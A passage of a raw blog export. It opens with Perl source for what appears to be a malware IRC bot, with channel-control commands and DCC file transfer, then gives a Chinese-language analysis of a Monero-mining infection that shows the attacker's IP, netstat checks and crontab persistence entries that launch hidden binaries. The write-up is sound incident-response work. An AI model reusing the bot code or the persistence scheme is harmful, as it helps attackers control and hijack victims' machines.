class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] +h $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">voice</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] +v $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">devoice</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] -v $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">ban</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] +b $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">unban</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] -b $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">kick</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;KICK $_[0] $_[1] :$_[2]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">modo</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">0</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">mode</span> </span>&#123; modo(@_); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">j</span> </span>&#123; &amp;<span class=\"keyword\">join</span>(@_); &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">join</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">0</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;JOIN $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">p</span> </span>&#123; part(@_); &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">part</span> </span>&#123;sendraw(<span class=\"string\">&quot;PART $_[0]&quot;</span>);&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">nick</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">0</span>;</span><br><span class=\"line\">  sendraw(<span class=\"string\">&quot;NICK $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">invite</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;INVITE $_[1] $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">topico</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;TOPIC $_[0] $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">topic</span> </span>&#123; topico(@_); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">whois</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">0</span>;</span><br><span class=\"line\">  sendraw(<span class=\"string\">&quot;WHOIS $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">who</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">0</span>;</span><br><span class=\"line\">  sendraw(<span class=\"string\">&quot;WHO $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">names</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">0</span>;</span><br><span class=\"line\">  sendraw(<span class=\"string\">&quot;NAMES $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">away</span> </span>&#123;</span><br><span class=\"line\">  sendraw(<span class=\"string\">&quot;AWAY $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">back</span> </span>&#123; away(); &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">quit</span> </span>&#123;</span><br><span class=\"line\">  sendraw(<span class=\"string\">&quot;QUIT :$_[0]&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">package</span> DCC;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">connections</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">my</span> @ready = $dcc_sel-&gt;can_read(<span class=\"number\">1</span>);</span><br><span class=\"line\">   <span class=\"keyword\">foreach</span> <span class=\"keyword\">my</span> $fh (@ready) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">my</span> $dcctipo = $DCC&#123;$fh&#125;<span class=\"string\">&#123;tipo&#125;</span>;</span><br><span class=\"line\">     <span class=\"keyword\">my</span> $arquivo = $DCC&#123;$fh&#125;<span class=\"string\">&#123;arquivo&#125;</span>;</span><br><span class=\"line\">     <span class=\"keyword\">my</span> $bytes = $DCC&#123;$fh&#125;<span class=\"string\">&#123;bytes&#125;</span>;</span><br><span class=\"line\">     <span class=\"keyword\">my</span> $cur_byte = $DCC&#123;$fh&#125;<span class=\"string\">&#123;curbyte&#125;</span>;</span><br><span class=\"line\">     <span class=\"keyword\">my</span> $nick = $DCC&#123;$fh&#125;<span class=\"string\">&#123;nick&#125;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">my</span> $msg;</span><br><span class=\"line\">     <span class=\"keyword\">my</span> $nread = <span class=\"keyword\">sysread</span>($fh, $msg, <span class=\"number\">10240</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">if</span> ($nread == <span class=\"number\">0</span> <span class=\"keyword\">and</span> $dcctipo =~ <span class=\"regexp\">/^(get|sendcon)$/</span>) &#123;</span><br><span class=\"line\">        $DCC&#123;$fh&#125;<span class=\"string\">&#123;status&#125;</span> = <span class=\"string\">&quot;Cancelado&quot;</span>;</span><br><span class=\"line\">        $DCC&#123;$fh&#125;<span class=\"string\">&#123;ftime&#125;</span> = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">        $dcc_sel-&gt;remove($fh);</span><br><span class=\"line\">        $fh-&gt;<span class=\"keyword\">close</span>;</span><br><span class=\"line\">        <span class=\"keyword\">next</span>;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">if</span> ($dcctipo eq <span class=\"string\">&quot;get&quot;</span>) &#123;</span><br><span class=\"line\">        $DCC&#123;$fh&#125;<span class=\"string\">&#123;curbyte&#125;</span> += <span class=\"keyword\">length</span>($msg);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">my</span> $cur_byte = $DCC&#123;$fh&#125;<span class=\"string\">&#123;curbyte&#125;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">open</span>(FILE, <span class=\"string\">&quot;&gt;&gt; $arquivo&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">print</span> FILE <span class=\"string\">&quot;$msg&quot;</span> <span class=\"keyword\">if</span> ($cur_byte &lt;= $bytes);</span><br><span class=\"line\">        <span class=\"keyword\">close</span>(FILE);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">my</span> $packbyte = <span class=\"keyword\">pack</span>(<span class=\"string\">&quot;N&quot;</span>, $cur_byte);</span><br><span class=\"line\">        <span class=\"keyword\">print</span> $fh <span class=\"string\">&quot;$packbyte&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($bytes == $cur_byte) &#123;</span><br><span class=\"line\">           $dcc_sel-&gt;remove($fh);</span><br><span class=\"line\">           $fh-&gt;<span class=\"keyword\">close</span>;</span><br><span class=\"line\">           $DCC&#123;$fh&#125;<span class=\"string\">&#123;status&#125;</span> = <span class=\"string\">&quot;Recebido&quot;</span>;</span><br><span class=\"line\">           $DCC&#123;$fh&#125;<span class=\"string\">&#123;ftime&#125;</span> = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">           <span class=\"keyword\">next</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">     &#125; <span class=\"keyword\">elsif</span> ($dcctipo eq <span class=\"string\">&quot;send&quot;</span>) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">my</span> $send = $fh-&gt;<span class=\"keyword\">accept</span>;</span><br><span class=\"line\">          $send-&gt;autoflush(<span class=\"number\">1</span>);</span><br><span class=\"line\">          $dcc_sel-&gt;add($send);</span><br><span class=\"line\">          $dcc_sel-&gt;remove($fh);</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;tipo&#125;</span> = <span class=\"string\">&#x27;sendcon&#x27;</span>;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;itime&#125;</span> = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;nick&#125;</span> = $nick;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;bytes&#125;</span> = $bytes;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;curbyte&#125;</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;arquivo&#125;</span> = $arquivo;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;ip&#125;</span> = $send-&gt;peerhost;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;porta&#125;</span> = $send-&gt;peerport;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;status&#125;</span> = <span class=\"string\">&quot;Enviando&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">open</span>(FILE, <span class=\"string\">&quot;&lt; $arquivo&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">my</span> $fbytes;</span><br><span class=\"line\">          <span class=\"keyword\">read</span>(FILE, $fbytes, <span class=\"number\">1024</span>);</span><br><span class=\"line\">          <span class=\"keyword\">print</span> $send <span class=\"string\">&quot;$fbytes&quot;</span>;</span><br><span class=\"line\">          <span class=\"keyword\">close</span> FILE;</span><br><span class=\"line\">     &#125; <span class=\"keyword\">elsif</span> ($dcctipo eq <span class=\"string\">&#x27;sendcon&#x27;</span>) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">my</span> $bytes_sended = <span class=\"keyword\">unpack</span>(<span class=\"string\">&quot;N&quot;</span>, $msg);</span><br><span class=\"line\">          $DCC&#123;$fh&#125;<span class=\"string\">&#123;curbyte&#125;</span> = $bytes_sended;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ($bytes_sended == $bytes) &#123;</span><br><span class=\"line\">             $fh-&gt;<span class=\"keyword\">close</span>;</span><br><span class=\"line\">             $dcc_sel-&gt;remove($fh);</span><br><span class=\"line\">             $DCC&#123;$fh&#125;<span class=\"string\">&#123;status&#125;</span> = <span class=\"string\">&quot;Enviado&quot;</span>;</span><br><span class=\"line\">             $DCC&#123;$fh&#125;<span class=\"string\">&#123;ftime&#125;</span> = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">             <span class=\"keyword\">next</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">open</span>(SENDFILE, <span class=\"string\">&quot;&lt; $arquivo&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">seek</span>(SENDFILE, $bytes_sended, <span class=\"number\">0</span>);</span><br><span class=\"line\">          <span class=\"keyword\">my</span> $send_bytes;</span><br><span class=\"line\">          <span class=\"keyword\">read</span>(SENDFILE, $send_bytes, <span class=\"number\">1024</span>);</span><br><span class=\"line\">          <span class=\"keyword\">print</span> $fh <span class=\"string\">&quot;$send_bytes&quot;</span>;</span><br><span class=\"line\">          <span class=\"keyword\">close</span>(SENDFILE);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">SEND</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> ($nick, $arquivo) = @_;</span><br><span class=\"line\">  <span class=\"keyword\">unless</span> (-r <span class=\"string\">&quot;$arquivo&quot;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">my</span> $dccark = $arquivo;</span><br><span class=\"line\">  $dccark =~ <span class=\"regexp\">s/[.*\\/](\\S+)/$1/</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">my</span> $meuip = $::irc_servers&#123;<span class=\"string\">&quot;$::IRC_cur_socket&quot;</span>&#125;&#123;<span class=\"string\">&#x27;meuip&#x27;</span>&#125;;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $longip = <span class=\"keyword\">unpack</span>(<span class=\"string\">&quot;N&quot;</span>,inet_aton($meuip));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">my</span> @filestat = <span class=\"keyword\">stat</span>($arquivo);</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $size_total=$filestat[<span class=\"number\">7</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ($size_total == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">my</span> ($porta, $sendsock);</span><br><span class=\"line\">  <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">    $porta = <span class=\"keyword\">int</span> <span class=\"keyword\">rand</span>(<span class=\"number\">64511</span>);</span><br><span class=\"line\">    $porta += <span class=\"number\">1024</span>;</span><br><span class=\"line\">    $sendsock = IO::Socket::INET-&gt;new(<span class=\"string\">Listen=&gt;</span><span class=\"number\">1</span>, <span class=\"string\">LocalPort =&gt;$porta</span>, <span class=\"string\">Proto =&gt;</span> <span class=\"string\">&#x27;tcp&#x27;</span>) <span class=\"keyword\">and</span> $dcc_sel-&gt;add($sendsock);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">until</span> $sendsock;</span><br><span class=\"line\"></span><br><span class=\"line\">  $DCC&#123;$sendsock&#125;<span class=\"string\">&#123;tipo&#125;</span> = <span class=\"string\">&#x27;send&#x27;</span>;</span><br><span class=\"line\">  $DCC&#123;$sendsock&#125;<span class=\"string\">&#123;nick&#125;</span> = $nick;</span><br><span class=\"line\">  $DCC&#123;$sendsock&#125;<span class=\"string\">&#123;bytes&#125;</span> = $size_total;</span><br><span class=\"line\">  $DCC&#123;$sendsock&#125;<span class=\"string\">&#123;arquivo&#125;</span> = $arquivo;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  &amp;::ctcp(<span class=\"string\">&quot;$nick&quot;</span>, <span class=\"string\">&quot;DCC SEND $dccark $longip $porta $size_total&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">GET</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;</span><br><span class=\"line\">  <span class=\"keyword\">return</span>(<span class=\"number\">0</span>) <span class=\"keyword\">if</span> (-e <span class=\"string\">&quot;$arquivo&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">open</span>(FILE, <span class=\"string\">&quot;&gt; $arquivo&quot;</span>)) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">close</span> FILE;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">my</span> $dccip=fixaddr($dcclongip);</span><br><span class=\"line\">  <span class=\"keyword\">return</span>(<span class=\"number\">0</span>) <span class=\"keyword\">if</span> ($dccporta &lt; <span class=\"number\">1024</span> <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> <span class=\"keyword\">defined</span> $dccip <span class=\"keyword\">or</span> $bytes &lt; <span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $dccsock = IO::Socket::INET-&gt;new(<span class=\"string\">Proto=&gt;</span><span class=\"string\">&quot;tcp&quot;</span>, <span class=\"string\">PeerAddr=&gt;$dccip</span>, <span class=\"string\">PeerPort=&gt;$dccporta</span>, <span class=\"string\">Timeout=&gt;</span><span class=\"number\">15</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">return</span> (<span class=\"number\">0</span>);</span><br><span class=\"line\">  $dccsock-&gt;autoflush(<span class=\"number\">1</span>);</span><br><span class=\"line\">  $dcc_sel-&gt;add($dccsock);</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;tipo&#125;</span> = <span class=\"string\">&#x27;get&#x27;</span>;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;itime&#125;</span> = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;nick&#125;</span> = $nick;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;bytes&#125;</span> = $bytes;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;curbyte&#125;</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;arquivo&#125;</span> = $arquivo;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;ip&#125;</span> = $dccip;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;porta&#125;</span> = $dccporta;</span><br><span class=\"line\">  $DCC&#123;$dccsock&#125;<span class=\"string\">&#123;status&#125;</span> = <span class=\"string\">&quot;Recebendo&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">Status</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $socket = <span class=\"keyword\">shift</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $sock_tipo = $DCC&#123;$socket&#125;<span class=\"string\">&#123;tipo&#125;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">unless</span> (<span class=\"keyword\">lc</span>($sock_tipo) eq <span class=\"string\">&quot;chat&quot;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $nick = $DCC&#123;$socket&#125;<span class=\"string\">&#123;nick&#125;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $arquivo = $DCC&#123;$socket&#125;<span class=\"string\">&#123;arquivo&#125;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $itime = $DCC&#123;$socket&#125;<span class=\"string\">&#123;itime&#125;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $ftime = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $status = $DCC&#123;$socket&#125;<span class=\"string\">&#123;status&#125;</span>;</span><br><span class=\"line\">    $ftime = $DCC&#123;$socket&#125;<span class=\"string\">&#123;ftime&#125;</span> <span class=\"keyword\">if</span> <span class=\"keyword\">defined</span>($DCC&#123;$socket&#125;<span class=\"string\">&#123;ftime&#125;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">my</span> $d_time = $ftime-$itime;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">my</span> $cur_byte = $DCC&#123;$socket&#125;<span class=\"string\">&#123;curbyte&#125;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $bytes_total =  $DCC&#123;$socket&#125;<span class=\"string\">&#123;bytes&#125;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">my</span> $rate = <span class=\"number\">0</span>;</span><br><span class=\"line\">    $rate = ($cur_byte/<span class=\"number\">1024</span>)/$d_time <span class=\"keyword\">if</span> $cur_byte &gt; <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $porcen = ($cur_byte*<span class=\"number\">100</span>)/$bytes_total;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">my</span> ($r_duv, $p_duv);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($rate =~ <span class=\"regexp\">/^(\\d+)\\.(\\d)(\\d)(\\d)/</span>) &#123;</span><br><span class=\"line\">       $r_duv = $3; $r_duv++ <span class=\"keyword\">if</span> $4 &gt;= <span class=\"number\">5</span>;</span><br><span class=\"line\">       $rate = <span class=\"string\">&quot;$1\\.$2&quot;</span>.<span class=\"string\">&quot;$r_duv&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($porcen =~ <span class=\"regexp\">/^(\\d+)\\.(\\d)(\\d)(\\d)/</span>) &#123;</span><br><span class=\"line\">       $p_duv = $3; $p_duv++ <span class=\"keyword\">if</span> $4 &gt;= <span class=\"number\">5</span>;</span><br><span class=\"line\">       $porcen = <span class=\"string\">&quot;$1\\.$2&quot;</span>.<span class=\"string\">&quot;$p_duv&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(<span class=\"string\">&quot;$sock_tipo&quot;</span>,<span class=\"string\">&quot;$status&quot;</span>,<span class=\"string\">&quot;$nick&quot;</span>,<span class=\"string\">&quot;$arquivo&quot;</span>,<span class=\"string\">&quot;$bytes_total&quot;</span>, <span class=\"string\">&quot;$cur_byte&quot;</span>,<span class=\"string\">&quot;$d_time&quot;</span>, <span class=\"string\">&quot;$rate&quot;</span>, <span class=\"string\">&quot;$porcen&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">fixaddr</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> ($address) = @_;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">chomp</span> $address;     </span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($address =~ <span class=\"regexp\">/^\\d+$/</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> inet_ntoa(<span class=\"keyword\">pack</span> <span class=\"string\">&quot;N&quot;</span>, $address);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">elsif</span> ($address =~ <span class=\"regexp\">/^[12]?\\d&#123;1,2&#125;\\.[12]?\\d&#123;1,2&#125;\\.[12]?\\d&#123;1,2&#125;\\.[12]?\\d&#123;1,2&#125;$/</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $address;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">elsif</span> ($address =~ <span class=\"regexp\">tr/a-zA-Z//</span>) &#123;                    </span><br><span class=\"line\">        <span class=\"keyword\">return</span> inet_ntoa(((<span class=\"keyword\">gethostbyname</span>($address))[<span class=\"number\">4</span>])[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Mining-malware-analysis\"><a href=\"#Mining-malware-analysis\" class=\"headerlink\" title=\"Mining malware analysis\"></a>Mining malware analysis</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -antp</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.imgur.com/nkRApHa.png\"></p>\n<p>大量的 ip 對 107.191.99.95 的 port 80 進行連線，且發現每次重開機後都會重新連線，應該是有開機自啟動。</p>\n<p><code>107.191.99.95</code></p>\n<p><img src=\"https://i.imgur.com/GnEg6vz.png\"></p>\n<p>經調查是門羅幣的挖礦</p>\n<p>再來分析，使用的程式 cron</p>\n<p>PID 為 1475</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps -aux |grep 1475 </span><br></pre></td></tr></table></figure>\n\n<p>發現是 .&#x2F;cron </p>\n<p>使用者居然是 test2 (看來是同學帳號亂建立，被暴力入侵而得)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find . -name cron*</span><br></pre></td></tr></table></figure>\n\n<p>找到檔案 cron.d</p>\n<p><img src=\"https://i.imgur.com/Gb4mMEM.png\"></p>\n<p>&#x2F;home&#x2F;test2&#x2F;.firefoxcatche&#x2F;cron.d</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* */12 * * * /home/test2/.firefoxcatche/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class=\"line\">@reboot /home/test2/.firefoxcatche/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class=\"line\">5 8 * * 0 /home/test2/.firefoxcatche/b/sync&gt;/dev/null 2&gt;&amp;1</span><br><span class=\"line\">@reboot /home/test2/.firefoxcatche/b/sync&gt;/dev/null 2&gt;&amp;1  </span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">5 1 * * * /tmp/.X13-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<p>test2 帳號的 crontab</p>\n<p><img src=\"https://i.imgur.com/b5yebu5.png\"></p>\n<p>被放了什麼東西進來</p>\n<p><img src=\"https://i.imgur.com/TeZPyGv.png\"></p>\n<p>主要的惡意程式邏輯應該在 .firefoxcatche</p>\n<p><img src=\"https://i.imgur.com/gQbEd8g.png\"></p>\n<p>cron.d 是最後要執行的程式</p>\n<p><img src=\"https://i.imgur.com/hxyv055.png\"></p>\n<p>會執行 </p>\n<p>a&#x2F;upd<br>@reboot 後 